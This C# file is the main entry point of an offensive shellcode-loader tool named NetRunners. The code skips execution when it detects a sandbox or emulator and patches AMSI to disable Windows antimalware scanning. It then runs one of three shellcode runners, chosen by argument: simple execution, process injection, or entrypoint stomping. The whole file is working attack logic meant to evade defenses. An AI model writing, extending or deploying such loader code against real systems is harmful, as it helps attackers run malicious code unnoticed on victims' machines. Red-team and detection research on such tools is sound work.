using System;
using static NetRunners.Runners;
using static NetRunners.Heuristics;
using static NetRunners.Patchers;

namespace NetRunners
{
    class Program
    {
        /// <summary>
        /// Entry point for this program, calls Heurisitic functions, and then parses through arguments to determine which runner to call.
        /// Retrieves Heuristic functions from Heuristics class and Runner functions from Runners class.
        /// Accepts one or no arguments at runtime. By default (no args specified), calls Runner function (Simple shellcode runner).
        /// </summary>
        /// <param name="-pi">Calls Process Injection Runner. Case Insensitive</param>
        /// <param name="-eps">Calls EntryPoint Stomping Runner. Case Insensitive</param>
        static void Main(string[] args)
        {
            // call heuristic functions
            if (Sleep()) { return; }    // if sleep was skipped halt execution
            if (NonEmulated()) { return; }    // if apis were not emulatd halt execution

            // check args number
            if (args.Length > 1)
            {
                Console.WriteLine("Error: Only one argument is allowed max.");
                return;
            }

            // patch amsi
            AmsiOs();

            // Determine the function call based on the argument provided, case insensitive
            string call = args.Length == 1 ? args[0] : string.Empty;
            switch (call.ToLower())
            {
                // process injection runner
                case "-pi":
                    Console.WriteLine("[+] Process Injection selected!");
                    PiRunner();
                    break;
                // entrypoint stomping runner
                case "-eps":
                    Console.WriteLine("[+] EntryPoint Stomping selected!");
                    EpsRunner();
                    break;
                // simple runner
                default:
                    Console.WriteLine("[+] Shellcode Runner selected!");
                    Runner();
                    break;
            }     
        }
    }
}
